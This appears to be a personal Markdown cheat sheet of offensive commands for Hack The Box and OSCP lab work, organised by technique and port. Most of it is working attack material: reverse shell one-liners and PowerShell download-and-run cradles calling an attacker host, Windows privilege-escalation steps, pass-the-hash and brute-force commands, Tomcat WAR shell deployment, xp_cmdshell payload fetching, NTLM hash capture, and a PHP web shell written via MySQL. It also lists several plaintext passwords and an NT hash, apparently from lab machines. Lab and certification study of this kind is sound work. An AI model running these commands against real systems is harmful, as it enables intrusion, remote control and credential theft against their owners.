# Useful Commands for HTB/OSCP
> **Website**: https://IslandDog.ky

> **Last Update**: 08/19/21

> **Recent Changes**: Additions directly related to IIS enumeration.

Head over to https://github.com/islanddog/kali-clean-pwnbox/ for my desktop build and configs.

## RustScan - #rustscan 
```bash
#Intial
rustscan -u 5000 -a ${PWD##*/} -- -A -sC -sV --script 'default,vuln' -oX scan && xsltproc scan -o scan.html && rm -rf scan
#AllPorts
sudo nmap -sC -sV -T4 -v -p- --script 'default,vuln' -oX scan-all 10.10.10.241 && xsltproc scan-all -o scan-allports.html && rm -rf scan-all
#UDP
sudo nmap -sU -sV --version-intensity 0 -F -n ${PWD##*/}
```

## Reverse Shell #OneLiners
```bash
bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
rm /tmp/h;mkfifo /tmp/h;cat /tmp/h|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/h
{nc.tradentional|nc|ncat|netcat} 10.0.0.1 1234 {-e|-c} /bin/bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()'
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'
```

## TTY SHELLS #tty
```bash
stty size #Find your terminal size -> 50 235
Ctrl-Z
stty raw -echo  // Disable shell echo
fg
export SHELL=bash
export TERM=xterm OR export TERM=xterm-256color
stty rows 50 columns 235
```

#tty_python
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

#tty_bash
```bash
echo os.system('/bin/bash')
```
#tty_sh
```sh
/bin/bash -i
```

#tty_perl
```perl
perl -e 'exec "/bin/bash"'
```

#tty_ruby
```rb
exec "/bin/bash"
```
#tty_lua
```bash
os.execute('/bin/bash')}
```

## Useful Kali Directories #WSO #PrivEsc #Windows 
```bash
ls /usr/share/webshells/webshells
ls /usr/share/windows-binaries/privesc
```

## File Uploading/Downloading #Windows #PowerShell #WGET #SMB 
```bash
powershell IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/webshells/Invoke-PowerShellTcp.ps1')
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.0.0.1/', '<DESTINATION_FILE>')
powershell "wget http://10.0.0.1/"
cscript wget.vbs http://10.0.0.1/file.exe FILEYOUNEED
sudo smbserver.py -comment 'Transfer' smb smb
sudo python -m SimpleHTTPServer 80
certutil.exe -urlcache -split -f "http://10.0.0.1/privesc/Powerless.bat" Powerless.bat
scp <SOURCE_FILE> <USER>@${PWD##*/}:<DESTINATION_FILE>
https://github.com/egre55/ultimate-file-transfer-list
```

## PrivEsc Tools #PrivEsc #LinPEAS #WinPEAS #Powerless
```bash
./LinEnum.sh -s -r report -e /tmp/ -t
winPEAS.bat/exe
LinPeas.sh
python suid3num.py
Seatbelt.exe -group=all
powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
Powerless.bat
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```

## PrivEsc Linux #PrivEsc #Linux #sudo #ssh 
```bash
sudo -l
Kernel Exploits
OS Exploits
Password reuse (mysql, .bash_history, 000- default.conf...)
Known binaries with suid flag and interactive (nmap)
Custom binaries with suid flag either using other binaries or with command execution
Writable files owned by root that get executed (cronjobs)
MySQL as root
Vulnerable services (chkrootkit, logrotate)
Writable /etc/passwd
Readable .bash_history
SSH private key
Listening ports on localhost
/etc/fstab
/etc/exports
/var/mail
Process as other user (root) executing something you have permissions to modify
SSH public key + Predictable PRNG
apt update hooking (PreInvoke)
```

## PrivEsc Windows 

#### CHECK FOR ACTIVE CVEs
```bash
whoami /all
sysinfo
```
#SeImpersonate #SeAssignPrimaryToken
#JuicyPotato #RottenPotato #LonelyPotato #HotPotato #RoguePotato #PrintSpoofter
SeImpersonate/SeAssignPrimaryToken - If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are ```SYSTEM```. Review the different Potatoes.

If the machine is -
> Windows 10 1809 & Windows Server 2019 - Rogue Potato.
> Windows 10 1809 < Windows Server 2019 - Juicy Potato.
> Windows Server 2019 - PrintSpoofer

https://github.com/itm4n/PrintSpoofer

```powershell
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe 10.0.0.1 1234 -e c:\windows\system32\cmd.exe" -t *
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe 10.0.0.1 1234 -e c:\windows\system32\cmd.exe" -t * -c <CLSID>
```
#CLSID
https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md

#Autorun - To execute it with elevated privileges we need to wait for someone in the Admin group to login.
```powershell
cd C:\Program Files\Autorun Program\
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.0.0.1/shells/win-1234.exe', '.\win-1234.exe')
```

#AlwaysInstallElevated
```powershell
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.0.0.1/shell-1234.msi', 'C:\Temp\shell-1234.msi')
msiexec /quiet /qn /i C:\Temp\shell-1234.msi
```

#ExecutableFiles
```powershell
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.0.0.1/win-1234.exe', 'C:\Temp\win-1234.exe')
copy /y c:\Temp\win-1234.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
sc start filepermsvc
```

#WeakServicePermission
```powershell
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.0.0.1/nc.exe', '.\nc.exe') #Grab Windows Binary
sc config <SERVICENAME> binpath= "<PATH>\nc.exe 10.0.0.1 1234 -e cmd.exe"
sc start <SERVICENAME>
or 
net start <SERVICENAME>
```

#UnquotedServicePaths 
```powershell
cd "C:\Program Files\Unquoted Path Service\"
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.0.0.1/Common.exe', '.\Common.exe')
sc start unquotedsvc
```

#Startup
```powershell
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.0.0.1/win-1234.exe', '.\win-1234.exe')
```

## PORTS

### 21 #FTP  
```bash
nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 ${PWD##*/}
```

### 22 #SSH 
CVE-2008-0166 - https://www.exploit-db.com/exploits/5720

### 53 #DNS 
```bash
dig @${PWD##*/} -x ${PWD##*/}
dnsenum ${PWD##*/}
dnsrecon -d ${PWD##*/}
dnsrecon -d ${PWD##*/} -a
dig axfr ${PWD##*/} @ns1.test.com
```
### 79 #FINGER
```bash
finger @${PWD##*/}
finger <USER>@${PWD##*/}
finger "|/bin/id@${PWD##*/}"
finger "|/bin/ls -a /${PWD##*/}"
```

### 80/8080/443 #HTTP 
#DirectoryScan #FeroxBuster #HostScan #Logins
```bash
feroxbuster -u http://${PWD##*/}/ -x php js txt -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --extract-links
nikto -host http://${PWD##*/} -C all -o nikto-scan.html
nikto -host http://${PWD##*/} -p 80,8080,1234 -C all -o nikto-all.html
nikto -h ${PWD##*/} -useproxy http://${PWD##*/}:4444 #squidcd
sqlmap --wizard
```

#IIS
```bash
msf6 auxiliary(scanner/http/iis_shortname_scanner)
/opt/SecLists/Discovery/Web-Content/IIS.fuzz.txt
```

#WordPress 
```bash
wpscan --url http://${PWD##*/}/ --enumerate ap,at,tt,cb,dbe,u,m
```

#webdav
```bash
cadaver http://${PWD##*/}:8080/webdav/
```
#ShellShock
```bash
git clone https://github.com/nccgroup/shocker; cd shocker; ./shocker.py -H ${PWD##*/}  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose;  ./shocker.py -H ${PWD##*/} --command "/bin/cat /etc/passwd" -c /cgi-bin/admin.cgi --verbose
```

#CGI - Specific
```bash
ffuf -w /opt/SecLists/Discovery/Web-Content/CGI-XPlatform.fuzz.txt -u http://${PWD##*/}/ccgi-bin/FUZZ -t 50
ffuf -w /opt/SecLists/Discovery/Web-Content/CGIs.txt -u http://${PWD##*/}/ccgi-bin/FUZZ -t 50
ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://${PWD##*/}/cgi-bin/FUZZ -e .sh,.pl,.cgi -t 100
```

#TOMCAT - Upload payload

Tomcat6:
```bash
wget 'http://<USER>:<PASSWORD>@${PWD##*/}:8080/manager/deploy?war=file:shell.war&path=/shell' -O -
```
Tomcat7/Above:
```bash
curl -v -u <USER>:<PASSWORD> -T shell.war 'http://${PWD##*/}:8080/manager/text/deploy?path=/shellh&update=true'
```

Then execute the payload
```bash
curl http://${PWD##*/}:8080/shell/
```

#GIT
```bash
./gitdumper.sh http://${PWD##*/}/.git/ git
./extractor.sh git git-extracted
```

#LFI/RFI - LoginForms - #SecLists Generic-SQLi.txt
```bash
/opt/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
http://${PWD##*/}/page=http://192.168.1.101/maliciousfile.txt%00
http://${PWD##*/}/page=http://192.168.1.101/maliciousfile.txt?
```

#ImageUpload 
[PayloadsAllTheThings - Malicious Images](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md)

### 110 (JOHN/MAIL) #POP3
```cmd
telnet 10.10.10.51 110
USER mindy
PASS mindy
list
retr 1
```

### 135 #RPC 
```bash
rpcinfo -p ${PWD##*/}
```

### 139/445 - ```smb://[putinip]/```#SMB 
#smbclient - Start here
```bash
smbclient -N -L ${PWD##*/}
smbclient -L \\\\${PWD##*/} -U 'Tiffany.Molina'
smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //${PWD##*/}/new-site -c 'put nc.exe nc.exe'
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh'
\\\\${PWD##*/}\\c$
enum4linux -a -k none '${PWD##*/}'
```
#crackmapexec #password_spray
```bash
crackmapexec smb ${PWD##*/} -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' --shares
crackmapexec smb ${PWD##*/} -u users.txt -p passwords.txt --shares --continue-on-success
medusa -h ${PWD##*/} -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt
winexe -U username //${PWD##*/} "cmd.exe" --system
```

#mounting-shares
```bash
mount -t cifs '//${PWD##*/}/new-site' smb -v -o user=tyler
umount smb
```

#SMB - Shells via Impacket
```bash
psexec.py <DOMAIN>/<USER>:<PASSWORD>@${PWD##*/}
wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@${PWD##*/}
smbexec.py <DOMAIN>/<USER>:<PASSWORD>@${PWD##*/}
atexec.py <DOMAIN>/<USER>:<PASSWORD>@${PWD##*/} <COMMAND>
```

#PTH - Pass the Hash
```bash
impacket-psexec -k Intelligence.htb/Administrator@dc.Intelligence.htb -no-pass
wmiexec.py <DOMAIN>/<USER>@${PWD##*/} -hashes :<NTHASH>
smbexec.py <DOMAIN>/<USER>@${PWD##*/} -hashes :<NTHASH>
atexec.py <DOMAIN>/<USER>@${PWD##*/} -hashes :<NTHASH>
pth-winexe -U username/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //${PWD##*/} cmd
```
### 161/162 #SNMP
```bash
snmp-check -c public ${PWD##*/}
onesixtyone -c /usr/share/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt ${PWD##*/}
```

### 389/636/3268/3269 #LDAP
```bash
sudo nmap 7sV -p389 ${PWD##*/}
rpcclient -U '' -N ${PWD##*/}
enumdomusers
enumdomgroups
ldapsearch -D "cn=admin,dc=acme,dc=com" "(objectClass=*)" -w ldapadmin -h ${PWD##*/}
ldapsearch -h ${PWD##*/} -p 389 -x -b "dc=megacorp,dc=local"
ldapsearch -h ${PWD##*/} -x -s base namingcontexts
ldapsearch -h ${PWD##*/} -x -s sub -b "DC=megacorp,DC=local" |tee ldap.out && cat ldap.out |grep -i memberof
```

### 1433 #MSSQL

Enumeration
```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 ${PWD##*/}
```

Login #Impacket and Cracking #hydra -
```bash
mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@${PWD##*/}
mssqlclient.py <USER>:<PASSWORD>@${PWD##*/}
hydra -L users -P passwords ${PWD##*/} mssql -vV -I -u
```

Once logged in you can run queries:
```sql
SQL> select @@ version;
```

Try to enable code execution #xp_cmdshell -
```bash
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami /all
SQL> xp_cmdshell "powershell -c IEX(New-Object System.Net.WebClient).DownloadString(\"http://10.0.0.1/www/webshells/Invoke-
PowerShellTcp.ps1\")
```

Steal the ```NTLM``` hash with responder, crack it with ```john``` or ```hashcat``` -
```sql
sudo smbserver.py -smb2support smb .
SQL> exec master..xp_dirtree '\\10.0.0.1\smb\'
```

### 1521 #Oracle
```bash
python3 odat.py all -s ${PWD##*/} -p 1521
mv ../www/shells/x64/rev-1234.exe .
python3 odat.py utlfile -s ${PWD##*/} -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ rev-1234.exe rev-1234.exe
python3 odat.py externaltable -s ${PWD##*/} -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ rev-1234.exe
```

### 2049 #NFS
```bash
showmount -e ${PWD##*/}
nmap --script=nfs-showmount ${PWD##*/}
sudo mount -v -t nfs ${PWD##*/}:<SHARE> <DIRECTORY>
sudo mount -v -t nfs -o vers=2 ${PWD##*/}:<SHARE> <DIRECTORY>
```
### 3306 #MySQL
```bash
nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 ${PWD##*/} -p 3306
hydra -L users -P passwords ${PWD##*/} mysql -vV -I -u
mysql -u <USER>
mysql -h ${PWD##*/} -u <USER> -p
connect [database]
show tables;
select * from [table name]
```
Try to execute code
```bash
select do_system('id');
\! sh
#Read&Write
select load_file('<FILE>');
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '<OUT_FILE>'
```
### 3389 #RDP
```bash
rdesktop -u guest -p guest ${PWD##*/} -g 94%
rdesktop -d <DOMAIN> -u <USERNAME> -p <PASSWORD> ${PWD##*/}
xfreerdp /u:[DOMAIN\]<USERNAME> /p:<PASSWORD> /v:${PWD##*/}
xfreerdp /u:[DOMAIN\]<USERNAME> /pth:<HASH> /v:${PWD##*/}
ncrack -vv --user Username -P /usr/share/wordlists/rockyou.txt rdp://${PWD##*/}
```

### 5800/58001/5900/5901 #VNC
```bash
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p 5800,58001,5900,5901 ${PWD##*/}
Linux - Default password is stored in: ~/.vnc/passwd
Windows -
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver
HKEY_CURRENT_USER\Software\TightVNC\Server
HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4
C:\Program Files\UltraVNC\ultravnc.ini
```
### 5985/5986 #WinRM
```bash
crackmapexec winrm ${PWD##*/} -u users -p passwords
evil-winrm -i ${PWD##*/} -u <USER> -p <PASSWORD>
evil-winrm -i ${PWD##*/} -u <USER> -H <HASH>
```

### Misc

#Windows #ReverseShells
```bash
cp /usr/share/windows-resources/binaries/nc.exe .
nc.exe -e cmd 10.0.0.1 1234
powershell IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/webshells/Invoke-PowerShellTcp.ps1')
```

#RestrictedEnvironments
https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
```bash
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

#PasswordDump - Review other article 
```bash
secretsdump.py -sam sam.hive -system system.hive -security security.hive -ntds ntds.dit LOCAL
```

#Bruteforce
```bash
hydra -V -f -L users -P passwords ftp://${PWD##*/} -u -vV
hydra -V -f -L users -P passwords ssh://${PWD##*/} -u -vV
```

![[id.png|20x20]] IslandDog - Christopher Soehnlein 2021
https://IslandDog.ky
